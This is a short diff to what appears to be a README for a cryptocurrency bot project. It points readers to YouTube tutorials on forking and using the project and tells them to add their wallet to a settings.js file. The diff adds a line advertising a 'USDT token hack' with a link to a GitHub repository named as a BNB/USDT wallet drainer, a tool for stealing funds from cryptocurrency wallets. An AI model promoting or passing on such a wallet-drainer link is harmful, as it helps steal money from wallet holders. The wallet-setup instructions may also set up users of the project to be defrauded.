@@ -3,8 +3,6 @@
 
 
 
-
-
 Make sure you fork this project before doing the tutorial here is how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 
@@ -13,6 +11,8 @@ Make sure you fork this project before doing the tutorial here is how to fork ht
 
 youtube tutorial on how to use this after forking https://youtu.be/ESxOvW-IOg0 
 
+
+!!! Check out my new USDT token hack https://github.com/moneywithbots/bnb-usdt-wallet-drainer
 
 !!!!!! Make sure you add your wallet to settings.js file !!!!!!!
 
